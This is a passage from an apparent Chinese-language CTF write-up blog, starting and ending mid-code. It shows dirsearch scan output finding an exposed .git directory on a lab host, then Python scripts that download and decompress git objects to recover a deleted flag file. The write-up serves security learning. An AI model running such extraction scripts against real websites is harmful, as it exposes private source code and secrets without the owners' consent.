class="string">b&quot;\r\n\r\n&quot;</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(parts) == <span class="number">2</span>:</span><br><span class="line">    body = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Body raw:&quot;</span>, body)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Body decoded:&quot;</span>, body.decode())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Raw response:&quot;</span>, data)</span><br></pre></td></tr></table></figure>
+
+<p>通过</p>
+<p><img src="/images/I7fzb3EMBoZwzaxnNzzcbzxgnzc.png"></p>
+<h2 id="问题-4-git-泄露-Dev’s-Regret"><a href="#问题-4-git-泄露-Dev’s-Regret" class="headerlink" title="[问题 4&#x2F;git 泄露] Dev’s Regret"></a>[问题 4&#x2F;git 泄露] Dev’s Regret</h2><p>读题，进来什么也没有</p>
+<p><img src="/images/PkeGbi5JnopkWGxSOpLce0Xlnjf.png"></p>
+<p>使用 dirsearch 扫盘，发现 git 泄露</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">301</span> -   169B - <span class="regexp">/.git  -&gt;  http:/</span><span class="regexp">/eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com/</span>.<span class="property">git</span>/</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -    27B - <span class="regexp">/.git/</span><span class="variable constant_">COMMIT_EDITMSG</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -   163B - <span class="regexp">/.git/</span>branches/</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -    1KB - <span class="regexp">/.git/</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -    23B - <span class="regexp">/.git/</span><span class="variable constant_">HEAD</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -    73B - <span class="regexp">/.git/</span>description</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -    2KB - <span class="regexp">/.git/</span>hooks/</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -   171B - <span class="regexp">/.git/</span>config</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -   325B - <span class="regexp">/.git/i</span>ndex</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -    41B - <span class="regexp">/.git/</span>refs/heads/master</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -   320B - <span class="regexp">/.git/</span>logs/refs/heads/master</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -   320B - <span class="regexp">/.git/</span>logs/<span class="variable constant_">HEAD</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -   240B - <span class="regexp">/.git/i</span>nfo/exclude</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -    59B - <span class="regexp">/.git/i</span>nfo/refs</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -   374B - <span class="regexp">/.git/</span>logs/</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -     1B - <span class="regexp">/.git/</span>objects/info/packs</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -   376B - <span class="regexp">/.git/</span>refs/</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -    1KB - <span class="regexp">/.git/</span>objects/</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">200</span> -   376B - <span class="regexp">/.git/i</span>nfo/</span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">301</span> -   169B - <span class="regexp">/.git/</span>logs/refs  -&gt;  <span class="attr">http</span>:<span class="comment">//eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com/.git/logs/refs/</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">301</span> -   169B - <span class="regexp">/.git/</span>logs/refs/heads  -&gt;  <span class="attr">http</span>:<span class="comment">//eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com/.git/logs/refs/heads/</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">301</span> -   169B - <span class="regexp">/.git/</span>refs/heads  -&gt;  <span class="attr">http</span>:<span class="comment">//eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com/.git/refs/heads/</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">57</span>:<span class="number">54</span>] <span class="number">301</span> -   169B - <span class="regexp">/.git/</span>refs/tags  -&gt;  <span class="attr">http</span>:<span class="comment">//eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com/.git/refs/tags/</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">58</span>:<span class="number">11</span>] <span class="number">200</span> -   131B - /index.<span class="property">html</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">58</span>:<span class="number">17</span>] <span class="number">200</span> -    37B - /<span class="variable constant_">README</span>.<span class="property">md</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">58</span>:<span class="number">20</span>] <span class="number">403</span> -   555B - <span class="regexp">/src/</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">58</span>:<span class="number">20</span>] <span class="number">301</span> -   169B - <span class="regexp">/src  -&gt;  http:/</span><span class="regexp">/eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com/</span>src/</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>.git/logs/HEAD</code>，得到</p>
+<p><img src="/images/DzAvbZrrdoXuj2xROsUcS9kanCe.png"></p>
+<p>访问这个路由，得到</p>
+<p><img src="/images/INTnbTGM5oy8yixK2HAcCbUInOb.png"></p>
+<p>这应该是 commit 对象</p>
+<p>利用脚本提取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com/.git/objects/19/ce8104322484c40b5da8089c2ae233d740420a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 正在下载commit对象...&quot;</span>)</span><br><span class="line">    response = requests.get(url, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 下载成功，大小: <span class="subst">&#123;<span class="built_in">len</span>(response.content)&#125;</span> bytes&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 解压git对象</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            decompressed = zlib.decompress(response.content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n[+] Commit对象内容:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">            <span class="built_in">print</span>(decompressed.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 提取tree哈希</span></span><br><span class="line">            lines = decompressed.decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">                <span class="keyword">if</span> line.startswith(<span class="string">&#x27;tree &#x27;</span>):</span><br><span class="line">                    tree_hash = line.split()[<span class="number">1</span>]</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n[*] Tree哈希: <span class="subst">&#123;tree_hash&#125;</span>&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 下载tree对象</span></span><br><span class="line">                    tree_url = <span class="string">f&quot;https://eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com/.git/objects/<span class="subst">&#123;tree_hash[:<span class="number">2</span>]&#125;</span>/<span class="subst">&#123;tree_hash[<span class="number">2</span>:]&#125;</span>&quot;</span></span><br><span class="line">                    tree_resp = requests.get(tree_url, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">                    <span class="keyword">if</span> tree_resp.status_code == <span class="number">200</span>:</span><br><span class="line">                        tree_data = zlib.decompress(tree_resp.content)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;\n[*] Tree对象大小: <span class="subst">&#123;<span class="built_in">len</span>(tree_data)&#125;</span> bytes&quot;</span>)</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment"># 解析tree对象</span></span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;\n[*] 解析tree中的文件...&quot;</span>)</span><br><span class="line">                        i = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(tree_data):</span><br><span class="line">                            null_pos = tree_data.find(<span class="string">b&#x27;\x00&#x27;</span>, i)</span><br><span class="line">                            <span class="keyword">if</span> null_pos == -<span class="number">1</span>:</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                                </span><br><span class="line">                            mode_name = tree_data[i:null_pos].decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                            parts = mode_name.split()</span><br><span class="line">                            <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">2</span>:</span><br><span class="line">                                mode, name = parts[<span class="number">0</span>], parts[<span class="number">1</span>]</span><br><span class="line">                                hash_start = null_pos + <span class="number">1</span></span><br><span class="line">                                file_hash = tree_data[hash_start:hash_start+<span class="number">20</span>].<span class="built_in">hex</span>()</span><br><span class="line">                                </span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">f&quot;  - <span class="subst">&#123;mode&#125;</span> <span class="subst">&#123;file_hash&#125;</span> <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">                                </span><br><span class="line">                                <span class="comment"># 下载文件内容</span></span><br><span class="line">                                file_url = <span class="string">f&quot;https://eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com/.git/objects/<span class="subst">&#123;file_hash[:<span class="number">2</span>]&#125;</span>/<span class="subst">&#123;file_hash[<span class="number">2</span>:]&#125;</span>&quot;</span></span><br><span class="line">                                file_resp = requests.get(file_url, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">                                <span class="keyword">if</span> file_resp.status_code == <span class="number">200</span>:</span><br><span class="line">                                    file_content = zlib.decompress(file_resp.content)</span><br><span class="line">                                    <span class="comment"># 提取blob的实际内容（去掉头部）</span></span><br><span class="line">                                    null_pos_file = file_content.find(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">                                    <span class="keyword">if</span> null_pos_file != -<span class="number">1</span>:</span><br><span class="line">                                        actual_content = file_content[null_pos_file+<span class="number">1</span>:]</span><br><span class="line">                                        <span class="built_in">print</span>(<span class="string">f&quot;    内容预览: <span class="subst">&#123;actual_content[:<span class="number">100</span>]&#125;</span>...&quot;</span>)</span><br><span class="line">                                        <span class="comment"># 保存文件</span></span><br><span class="line">                                        <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                                            f.write(actual_content)</span><br><span class="line">                                        <span class="built_in">print</span>(<span class="string">f&quot;    已保存为: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">                                </span><br><span class="line">                                i = hash_start + <span class="number">20</span></span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                        </span><br><span class="line">        <span class="keyword">except</span> zlib.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] 解压失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 原始内容 (hex): <span class="subst">&#123;response.content[:<span class="number">100</span>].<span class="built_in">hex</span>()&#125;</span>...&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">elif</span> response.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 404 Not Found - 对象可能不存在或路径错误&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] HTTP <span class="subst">&#123;response.status_code&#125;</span>: <span class="subst">&#123;response.text[:<span class="number">100</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> requests.exceptions.SSLError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] SSL证书错误，尝试使用verify=False&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[-] 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>查看程序响应:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[<span class="operator">*</span>] 正在下载<span class="keyword">commit</span>对象...</span><br><span class="line">C:\Users\legen\AppData\<span class="keyword">Local</span>\Programs\Python\Python314\Lib\site<span class="operator">-</span>packages\urllib3\connectionpool.py:<span class="number">1097</span>: InsecureRequestWarning: Unverified HTTPS request <span class="keyword">is</span> being made <span class="keyword">to</span> host <span class="string">&#x27;eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com&#x27;</span>. Adding certificate verification <span class="keyword">is</span> strongly advised. See: https:<span class="operator">/</span><span class="operator">/</span>urllib3.readthedocs.io<span class="operator">/</span>en<span class="operator">/</span>latest<span class="operator">/</span>advanced<span class="operator">-</span>usage.html#tls<span class="operator">-</span>warnings  </span><br><span class="line">  warnings.warn(</span><br><span class="line">[<span class="operator">+</span>] 下载成功，大小: <span class="number">162</span> bytes</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] <span class="keyword">Commit</span>对象内容:</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="keyword">commit</span> <span class="number">217</span>tree d8ee21ae894000b6ef5b3160ec9c95a66419d35b</span><br><span class="line">parent <span class="number">76</span>fa751cbd79d9259b51c072830243b95a63b13f</span><br><span class="line">author dev <span class="operator">&lt;</span>dev<span class="variable">@example</span>.com<span class="operator">&gt;</span> <span class="number">1704153600</span> <span class="operator">+</span><span class="number">0000</span></span><br><span class="line">committer dev <span class="operator">&lt;</span>dev<span class="variable">@example</span>.com<span class="operator">&gt;</span> <span class="number">1704153600</span> <span class="operator">+</span><span class="number">0000</span></span><br><span class="line"></span><br><span class="line">Remove <span class="keyword">sensitive</span> flag file</span><br><span class="line"></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>
+
+<p>发现 flag 被删除了</p>
+<p>并得到:</p>
+<ol>
+<li>Tree 哈希: <code>d8ee21ae894000b6ef5b3160ec9c95a66419d35b</code></li>
+<li>Parent commit 哈希: <code>76fa751cbd79d9259b51c072830243b95a63b13f</code></li>
+</ol>
+<p>利用脚本比较 commit 和 parent commit，找到 Parent commit 的 tree 哈希</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_object</span>(<span class="params">hash_val</span>):</span><br><span class="line">    url = <span class="string">f&quot;https://eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com/.git/objects/<span class="subst">&#123;hash_val[:<span class="number">2</span>]&#125;</span>/<span class="subst">&#123;hash_val[<span class="number">2</span>:]&#125;</span>&quot;</span></span><br><span class="line">    resp = requests.get(url, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> zlib.decompress(resp.content)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_tree</span>(<span class="params">tree_data</span>):</span><br><span class="line">    files = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(tree_data):</span><br><span class="line">        null_pos = tree_data.find(<span class="string">b&#x27;\x00&#x27;</span>, i)</span><br><span class="line">        <span class="keyword">if</span> null_pos == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        mode_name = tree_data[i:null_pos].decode()</span><br><span class="line">        parts = mode_name.split()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">2</span>:</span><br><span class="line">            name = parts[<span class="number">1</span>]</span><br><span class="line">            file_hash = tree_data[null_pos+<span class="number">1</span>:null_pos+<span class="number">21</span>].<span class="built_in">hex</span>()</span><br><span class="line">            files.append((name, file_hash))</span><br><span class="line">        i = null_pos + <span class="number">21</span></span><br><span class="line">    <span class="keyword">return</span> files</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_file</span>(<span class="params">filename, content</span>):</span><br><span class="line">    <span class="comment"># 移除git对象头 &#x27;blob &lt;size&gt;\x00&#x27;</span></span><br><span class="line">    null_pos = content.find(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> null_pos != -<span class="number">1</span>:</span><br><span class="line">        file_content = content[null_pos+<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(file_content)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 保存文件: <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 显示文本内容预览</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text_preview = file_content[:<span class="number">200</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> text_preview.lower() <span class="keyword">or</span> <span class="string">&#x27;ctf&#x27;</span> <span class="keyword">in</span> text_preview.lower():</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    可能包含flag: <span class="subst">&#123;text_preview[:<span class="number">100</span>]&#125;</span>...&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 下载parent commit</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 下载parent commit...&quot;</span>)</span><br><span class="line">parent_data = download_object(<span class="string">&quot;76fa751cbd79d9259b51c072830243b95a63b13f&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> parent_data:</span><br><span class="line">    parent_text = parent_data.decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Parent commit内容:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(parent_text)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取parent的tree哈希</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> parent_text.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">&#x27;tree &#x27;</span>):</span><br><span class="line">            parent_tree_hash = line.split()[<span class="number">1</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[*] Parent tree哈希: <span class="subst">&#123;parent_tree_hash&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 2. 下载parent tree</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] 下载parent tree...&quot;</span>)</span><br><span class="line">            parent_tree_data = download_object(parent_tree_hash)</span><br><span class="line">            <span class="keyword">if</span> parent_tree_data:</span><br><span class="line">                parent_files = parse_tree(parent_tree_data)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Parent tree中的文件 (<span class="subst">&#123;<span class="built_in">len</span>(parent_files)&#125;</span>个):&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> name, hash_val <span class="keyword">in</span> parent_files:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  - <span class="subst">&#123;name&#125;</span> (<span class="subst">&#123;hash_val&#125;</span>)&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 3. 下载这些文件（特别是可能包含flag的）</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> name.lower() <span class="keyword">or</span> name <span class="keyword">in</span> [<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;.flag&#x27;</span>, <span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;key&#x27;</span>]:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;[*] 下载可疑文件: <span 